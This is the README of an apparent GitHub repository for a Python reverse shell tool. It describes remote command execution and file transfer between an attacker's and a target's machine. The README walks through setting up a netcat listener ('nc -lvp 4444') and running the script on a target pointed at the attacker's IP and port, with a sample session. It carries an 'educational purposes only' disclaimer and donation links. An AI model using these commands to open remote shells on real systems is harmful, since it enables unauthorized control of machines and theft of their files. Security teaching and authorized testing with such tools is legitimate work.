# Reverse Shell Tool

This repository contains reverse shell tool written in Python. This tool is for educational purposes only and should be used in a controlled, authorized environment.

## Features

- Execute commands on the target machine.
- Change directory on the target machine.
- Upload files from the attacker's machine to the target machine.
- Download files from the target machine to the attacker's machine.

## Prerequisites

- Python installed on both the attacker's and target's machines.
- Network access between the attacker's and target's machines.
- Necessary ports open and not blocked by firewalls.

## Usage
git clone https://github.com/Guruh-dev/Reverse-Shell.git

cd Reverse-Shell

### Set Up the Listener

On the attacker's machine, set up a listener to receive the reverse shell connection. You can use `netcat` (nc) for this purpose.

```sh
python3 reverse_shell.py
python3 reverse_shell.py <target_ip> <target_port>
nc -lvp <target_port>
whoami
user
upload example.txt
download example.txt
cd /tmp
exit

## Example Interaction
1. Attacker's Machine:

Set up the listener:
nc -lvp 4444
2. Target Machine:

Run the script:
python3 reverse_shell.py 192.168.1.100 4444

3. Attacker's Machine:

Send a command:
whoami

Receive the output:
user

 ## 💰 You can help me by Donating
  [![BuyMeACoffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/guruhdev) 
  [![PayPal](https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white)](https://paypal.me/https://www.paypal.me/killecstasy) 
  
